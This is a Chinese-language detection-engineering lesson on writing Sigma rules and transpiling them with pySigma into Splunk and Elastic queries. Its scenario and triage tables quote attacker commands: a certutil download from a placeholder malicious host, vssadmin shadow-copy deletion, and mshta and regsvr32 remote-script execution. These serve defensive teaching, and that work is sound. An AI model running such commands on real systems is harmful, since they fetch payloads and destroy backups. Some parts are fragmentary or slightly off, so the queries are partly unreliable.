# 17.2 Sigma 通用日誌偵測規則與轉譯 (Sigma Rules & pySigma Transpilation)

## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

某跨國企業遭受了新型勒索軟體攻擊，威脅情報團隊在凌晨 02:30 發布了緊急 CTI 報告，揭露攻擊者利用 `certutil.exe -urlcache -split -f http://malicious.site/payload.b64` 進行無檔案 Stager 下載，並透過 `vssadmin.exe delete shadows /all /quiet` 批量銷毀磁碟陰影複製（Volume Shadow Copies）。

然而，企業內部的資安架構極度破碎：總部使用 Splunk 集中分析，亞太分公司使用 Elastic (ELK) 監控，歐洲分公司則使用 Microsoft Sentinel。SOC 團隊若要為每個 SIEM 平台手動編寫專屬查詢語法（Splunk SPL、Elastic KQL、Azure KQL），不僅耗費數小時，且各分部寫出的檢測邏輯容易出現盲區或欄位不一致。

「偵測邏輯應當與日誌平台解耦。」此時偵測工程師（Detection Engineer）的核心武器，就是 **Sigma——資安日誌界的通用特徵定義語言（The Generic Signature Format for SIEM Systems）**。

藍軍偵測工程師的標準作業心法：
1. **日誌分類與資料模型映射（Logsource Definition）**：明確界定規則適用的資料類別（`category: process_creation`、`product: windows`）。
2. **多維度條件定義（Detection Selections & Filters）**：運用精確匹配、開頭/結尾包含（`|contains`、`|endswith`）、Base64 忽略位移（`|base64offset`）等高階修飾符定義惡意行為特徵。
3. **誤報消除與白名單過濾（Filter Tuning）**：透過 `filter` 區塊明確剔除企業合法的軟體部署、定期備份腳本與自動化維運行程。
4. **自動化轉譯流水線（Transpilation via pySigma）**：利用新一代轉譯引擎 `sigma-cli`，將單一 YAML 規則瞬間轉譯為 Splunk SPL、Elastic KQL、QRadar AQL 與 Sentinel KQL。
5. **金鑰指標與框架映射（ATT&CK & Level Mapping）**：標註 MITRE ATT&CK 戰術/技術代碼（如 `T1490`、`T1105`）與嚴重性等級（`critical`、`high`），實現企業防禦矩陣的自動化量化評估。

```

                                │
                                ▼
         ┌─────────────────────────────────────────────┐
         │ Sigma 通用規則定義 (YAML Format)            │
         │ • Logsource : category: process_creation    │
         │ • Selection : Image|endswith: vssadmin.exe  │
         │ • CommandLine|contains: delete shadows      │
         │ • Filter    : ParentImage: backup_agent.exe │
         │ • Condition : selection and not filter      │
         └──────────────────────┬──────────────────────┘

                                │

       ▼                        ▼                        ▼
```

## 🧩 第一動：底層機制/協定解剖 (Mechanics & Physical Structs)

### 1. Sigma 規則規格架構 (Sigma Specification 2.0)

一份合規的 Sigma 規則基於嚴格的 YAML 語法規範，由六大核心結構單元構成：

```yaml
title: 偵測利用 Vssadmin 刪除磁碟陰影複製防禦恢復
id: e4b6ae24-25e9-467a-923f-e77a28e3b5e7
status: stable
description: 攻擊者常於發動勒索軟體加密前，利用 vssadmin 工具刪除 Volume Shadow Copies，阻止受害者透過還原點復原檔案。
references:
    - https://attack.mitre.org/techniques/T1490/
author: SOC Detection Engineering Team
date: 2026-09-12
tags:
    - attack.impact
    - attack.t1490

# 1. 資料源定義 (Logsource)
logsource:
    category: process_creation
    product: windows

# 2. 偵測邏輯核心 (Detection)
detection:
    selection_cmd:
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    selection_image:
        - Image|endswith: '\\vssadmin.exe'
        - OriginalFileName: 'VSSADMIN.EXE'
    filter_legit_backup:
        ParentImage|endswith:
            - '\\Program Files\\Veeam\\Backup\\VeeamAgent.exe'
            - '\\Program Files\\Veritas\\NetBackup\\bin\\bpbkar32.exe'
    condition: (selection_cmd and selection_image) and not filter_legit_backup

# 3. 欄位與嚴重性 (Attributes)
falsepositives:
    - 企業內部特定大型備份軟體在執行全量快照清理時的正常維運
level: high
```

### 2. 修飾符（Value Modifiers）與型態轉換底層原理

在 `detection` 區塊中，欄位名稱後方可鏈接一或多個修飾符（如 `CommandLine|contains|all`），用以精確控制目標日誌欄位的比對行為：

| 修飾符語法 | 比對語意與行為 | 底層轉譯目標示例 (Splunk / Elastic) |
| :--- | :--- | :--- |
| `field|contains` | 包含特定子字串（大小寫不敏感）。 | Splunk: `field="*value*"`<br>Elastic: `field: *value*` |
| `field|startswith` | 以特定字串為開頭。 | Splunk: `field="value*"`<br>Elastic: `field: value*` |
| `field|endswith` | 以特定字串為結尾（常用於副檔名或二進位名）。 | Splunk: `field="*value"`<br>Elastic: `field: *value` |
| `field|all` | 清單中的所有項目必須**同時滿足（AND 邏輯）**。 | `(field="*a*" AND field="*b*")` |
| `field|re` | 使用常規正則表達式（PCRE 相容）比對。 | Splunk: `regex field="(?i)regex"`<br>Elastic: `field: /regex/` |
| `field|base64offset` | **高階抗混淆！** 自動計算該字串在 Base64 編碼下 3 種可能的位移形態並全部匹配！ | 自動衍生出 3 種對齊補齊後的 Base64 字串變體。 |
| `field|windash` | 兼容 Windows 指令引數風格（自動適配 `-`, `/`, `--`）。 | 自動匹配 `-urlcache`, `/urlcache` 等不同寫法。 |

### 3. pySigma 現代轉譯引擎架構

早期 Sigma 依賴 Python 2 的單體架構工具 `sigmac`，現已被模組化、插件化的 **pySigma / sigma-cli** 全面取代：

1. **Parser（解析器）**：
   讀取 YAML 檔案，執行語法驗證（Schema Validation），並將其轉換為記憶體中的抽象語法樹（AST - Abstract Syntax Tree）。
2. **Pipeline（欄位映射管道）**：
   解決跨平台欄位名稱歧異的核心！例如通用欄位 `Image`，在 Sysmon 管道中會被映射為 `Image`，在 Windows 原生安全日誌（Event ID 4688）管道中會被映射為 `NewProcessName`，在 CrowdStrike Falcon 管道中則會被映射為 `ImageFileName`。
3. **Backend（後端生成器）**：
   遍歷 AST 並結合目標系統的專屬查詢語法樹，輸出高度優化、無多餘括號且符合平台索引特性的最終查詢語句（如 Splunk SPL 或 Azure KQL）。

```
[Sigma YAML] ──► [pySigma Parser] ──► [AST 語法樹]
                                            │
                                            ▼
                                   [Pipeline 欄位對齊]
                         (例如: Image ➔ NewProcessName / TargetProcessAddress)
                                            │
                                            ▼
                                  [Backend 後端生成]
                                            │
                ┌───────────────────────────┼───────────────────────────┐
                ▼                           ▼                           ▼
        [Splunk Backend]            [Elastic Backend]          [Azure KQL Backend]
```

## 🧭 第二動：解碼意圖——異常特徵速查表

| 封包與日誌特徵現象（看到什麼） | 底層成因與攻擊手法（是什麼攻擊） | 威脅影響與處置優先級（怎麼應對） |
| :--- | :--- | :--- |
| 命令列出現 `certutil.exe -urlcache -split -f http://...` 或 `certutil -decode` | 攻擊者濫用微軟內建憑證公用程式（LOLBAS - Living Off the Land Binaries）作為惡意下載器或解碼器（T1105）。 | **高**<br>1. 立即終結發起該指令的父行程<br>2. 抓取被下載檔案的本機路徑與 Hash<br>3. 防火牆封鎖遠端下載 IP |
| 命令列出現 `mshta.exe vbscript:Close(Execute("GetObject..."))` 或遠端 `.hta` URL | 攻擊者利用微軟 HTML 應用程式主機（Mshta）繞過應用程式白名單（AppLocker），在記憶體中執行 VBScript/JScript（T1218.005）。 | **危急 (P1)**<br>1. 該終端已被執行無檔案攻擊，立即隔離網路<br>2. 提取父進程名與發起帳號身分<br>3. 檢視其衍生之後續進程樹 |
| 進程 `rundll32.exe` 命令行包含未預期目錄下的 DLL，或導出函數帶有 `#1` 數字序號 | 攻擊者利用 Rundll32 載入未註冊的惡意動態鏈接庫，規避直接執行 exe 的安全監控（T1218.011）。 | **高**<br>1. 收集該 DLL 實體檔案與其父進程資訊<br>2. 檢測該 DLL 的 Authenticode 數位簽名<br>3. 進行全網終端同 Hash 威脅獵捕 |
| 進程 `regsvr32.exe /s /n /u /i:http://... scrobj.dll`（Squiblydoo 攻擊） | 攻擊者利用 Regsvr32 下載並執行遠端 COM Scriptlet（`.sct`），實現全內存代碼執行且完全繞過 AppLocker（T1218.010）。 | **危急 (P1)**<br>1. 立即隔離主機並重設受害使用者憑證<br>2. 阻斷對外 HTTP 連線<br>3. 清查註冊表 COM 元件劫持項目 |
| 規則轉譯後在 Splunk 中產生每小時數千筆告警，點開全為內部自動化發行腳本 | 規則設計時未配置 `filter` 排除白名單，或將通配條件設為過於寬鬆（如單純匹配 `powershell.exe -enc` 而未排除合法內部維運命令）。 | **低（規則過敏）**<br>1. 迅速將該規則轉為「靜默觀察模式（Audit Mode）」<br>2. 分析正常發行腳本的命令列模式與父行程特徵<br>3. 在 Sigma 規則中新增精確的 `filter` 邏輯 |
| 命令列包含 `whoami /all`、`net user /domain`、`nltest /dclist:` 密集連續執行 | 攻擊者在取得端點立足點後，進行自動化內網與 AD 網域偵察枚舉（T1087 / T1018）。 | **中~高**<br>1. 識別發起該批量偵察的帳號與主機<br>2. 研判該主機是否已被攻擊者控制（Beacon）<br>3. 提高監控敏感度，預防即刻發生的橫向移動 |

### 3. 生產級實戰 Sigma 規則撰寫範本：LOLBAS Certutil 遠端下載檢測

建立檔案 `/etc/sigma/rules/proc_creation_win_certutil_download.yml`：

```yaml
title: 偵測利用 Certutil 進行惡意檔案下載與解碼 (LOLBAS)
id: 3a2f0001-44bb-498c-bb78-75c1a7000001
status: production
description: 攻擊者常濫用 Windows 內建的 certutil.exe，搭配 -urlcache 或 -decode 參數，繞過網路邊界限制下載外網二進位木馬或還原 Base64 載荷。
references:
    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
    - https://attack.mitre.org/techniques/T1105/
author: BlueTeam_Detection_Engineer
date: 2026-09-12
tags:
    - attack.command_and_control
    - attack.t1105
    - attack.defense_evasion
    - attack.t1140

logsource:
    category: process_creation
    product: windows

detection:
    selection_image:
        - Image|endswith: '\\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'

    selection_download_flags:
        CommandLine|contains:
            - 'urlcache'
            - 'split'

    selection_decode_flags:
        CommandLine|contains:
            - 'decode'
            - 'decodehex'

    selection_network_protocol:
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'ftp://'

    filter_legit_corporate_ca:
        ParentImage|endswith:
            - '\\Windows\\System32\\services.exe'
        CommandLine|contains:
            - '-ping'
            - '-catemplates'

    condition: selection_image and ((selection_download_flags and selection_network_protocol) or selection_decode_flags) and not filter_legit_corporate_ca

falsepositives:
    - 內部企業 AD CS 憑證授權伺服器在同步憑證吊銷清單 (CRL) 時的合規維運指令
level: high
```

### 4. 轉譯產物實例對照 (Transpilation Showcase)

使用上述規則，透過 `sigma convert` 自動產出兩大 SIEM 平臺的最佳化生產代碼：

#### 轉譯產物 A：Splunk SPL 實戰查詢代碼
```splunk
index=wineventlog (EventCode=4688 OR EventCode=1) 
(
    (NewProcessName="*\\certutil.exe" OR OriginalFileName="CertUtil.exe") 
    AND 
    (
        ((ProcessCommandLine="*urlcache*" OR ProcessCommandLine="*split*") AND (ProcessCommandLine="*http://*" OR ProcessCommandLine="*https://*" OR ProcessCommandLine="*ftp://*")) 
        OR 
        (ProcessCommandLine="*decode*" OR ProcessCommandLine="*decodehex*")
    )
) 
NOT 
(
    ParentProcessName="*\\Windows\\System32\\services.exe" 
    AND 
    (ProcessCommandLine="*-ping*" OR ProcessCommandLine="*-catemplates*")
)
| table _time, ComputerName, SubjectUserName, NewProcessName, ProcessCommandLine, ParentProcessName
```

#### 轉譯產物 B：Elastic KQL (ECS 規範) 實戰查詢代碼
```kql
process.executable: *\\certutil.exe and (
    ((process.command_line: *urlcache* or process.command_line: *split*) and (process.command_line: *http\:\/\/\\* or process.command_line: *https\:\/\/\\* or process.command_line: *ftp\:\/\/\\*)) or 
    (process.command_line: *decode* or process.command_line: *decodehex*)
) and not (
    process.parent.executable: *\\Windows\\System32\\services.exe and (process.command_line: *-ping* or process.command_line: *-catemplates*)
)
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### SOC 研判核心問題表

| 核心提問（研判維度） | 本技術點實戰檢核標準 |
| :--- | :--- |
| **Q1：發起此行程的父進程（Parent Process）是否為互動式終端？** | 檢查父行程：若是 `explorer.exe`、`cmd.exe`、`powershell.exe`、`wscript.exe` 或 Web 服務（`w3wp.exe`、`httpd`），**高機率為人為入侵或惡意巨集啟動**；若是合法排程管理員（`taskeng.exe`、`services.exe`），需進一步檢查排程來源。 |
| **Q2：命令列中下載或操作的遠端 URL 是否指向外網不可信網域？** | 提取命令列中的 IP/Domain。若指向公網 IP、動態 DNS、免洗網盤（Pastebin, Discord CDN, GitHub raw），必為真實攻擊；若為內部 WSUS、AD 憑證內部節點（`pki.corp.local`），則偏向業務維運。 |
| **Q3：命令執行後的落地檔案路徑（Target Path）是否在暫存目錄？** | 檢查被寫入的檔案路徑是否位於 `C:\Users\*\AppData\Local\Temp`、`C:\Windows\Temp`、`C:\ProgramData`。這些目錄屬於標準攻擊者落地目標，正常軟體安裝程序多有專屬安裝目錄。 |
| **Q4：該命令是否為企業合規管理工具（如 SCCM, BigFix, Tanium）派發？** | 檢查進程親緣樹頂端是否來自企業合法 EMM/EDR 管理客戶端，比對發起帳號是否為 `NT AUTHORITY\SYSTEM` 搭配特定的維運工作識別碼。 |
| **Q5：命令列參數是否存在字元插入混淆（Character Insertion）？** | 攻擊者常在命令中混入脫字符號（如 `c^e^r^t^u^t^i^l`）或引號（`"c"ertutil`）以規避單純文字比對。正規腳本絕不會包含多餘的脫字符號。 |
| **Q6：同一主機在前後 5 分鐘內是否有密集連續的 LOLBAS 呼叫？** | 關聯前後時間窗口日誌：是否在 `certutil` 下載後，緊接著出現 `regsvr32`、`rundll32` 或 `powershell -enc`？連續調用多個微軟白二進位程式是典型紅隊滲透鏈特徵。 |
| **Q7：執行命令的帳號權限與登入方式為何？** | 查詢該帳號的 Logon ID（Event ID 4624）。該帳號是否在幾分鐘前才剛從外網 VPN 登入？還是剛剛透過遠端桌面（LogonType 10）連入？ |
| **Q8：落地檔案的副檔名與真實內容雜湊是否相符？** | 檢查被下載的檔案：副檔名若是 `.txt` 或 `.log`，但檔案標頭十六進位卻是 `4D 5A`（Windows PE 執行檔）或 `7F 45 4C 46`（Linux ELF），屬於典型二階段惡意程式偽裝。 |

## 🛡️ 第五動：處置圍堵與系統加固 SOP

### 1. LOLBAS 惡意調用現場緊急圍堵

若確認終端遭黑客利用 LOLBAS 工具發起攻擊，依序執行處置：

```powershell
# 步驟 1：立即中斷發起可疑命令之進程實例 (假設其 PID 為 4892)
Stop-Process -Id 4892 -Force
```

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：在 Sigma 規則中，`CommandLine|contains|all` 與 `CommandLine|contains` 有什麼本質上的布林邏輯差異？**
  - *驗收標準*：答出當清單內包含多個字串時，`contains` 預設為 **OR（只要命中任一字串即符合）**；加上 `|all` 修飾符後，則轉變為 **AND（所有列出的字串必須同時存在於命令列中）**。
- [ ] **Q2：為什麼在現代偵測工程中，推薦以 pySigma 的 `OriginalFileName` 作為輔助檢測欄位？**
  - *驗收標準*：答出防範攻擊者更改二進位檔案名稱。攻擊者常將 `certutil.exe` 重新命名為 `update.exe` 規避 `Image|endswith: certutil.exe` 比對，但編譯在二進位內部資源區塊的 `OriginalFileName` 依然為 `CertUtil.exe`，能有效識破偽裝。
- [ ] **Q3：Sigma 規則中的 `base64offset` 修飾符是如何解決「Base64 編碼位移（Offset Padding）」問題的？**
  - *驗收標準*：指出 ASCII 字串在 Base64 編碼時，會依據其在整段文字中的起始位元組位置（0, 1, 2）產生 3 種完全不同的編碼輸出。`base64offset` 會自動產生這 3 種對齊補齊後的特徵串，免去工程師手動計算填充字元的繁瑣步驟。
- [ ] **Q4：在企業大規模部署 Sigma 規則流水線時，什麼是「Pipeline（轉換管道）」？如果缺少了它會造成什麼嚴重後果？**
  - *驗收標準*：答出 Pipeline 負責將 Sigma 抽象標準欄位（如 `Image`, `CommandLine`）映射為目標日誌系統的具體實體欄位（如 Sysmon 的 `Image`、原生 4688 的 `NewProcessName` 或 ECS 的 `process.executable`）。若缺少 Pipeline，轉譯出的查詢語句會包含無法識別的虛擬欄位，導致查詢完全查不出任何資料。
- [ ] **Q5：當一條偵測惡意 PowerShell 下載的 Sigma 規則轉譯上線後，發現內部開發人員維運腳本引發大量誤報，最標準的 Sigma-Native 調優方式是什麼？**
  - *驗收標準*：答出在 `detection` 區塊中建立獨立的 `filter` 區塊，精確定義合法的 `ParentImage`、特定簽署腳本名稱或固定維運參數，並將 `condition` 修改為 `selection and not filter`，堅決不污染原始 `selection` 惡意特徵。
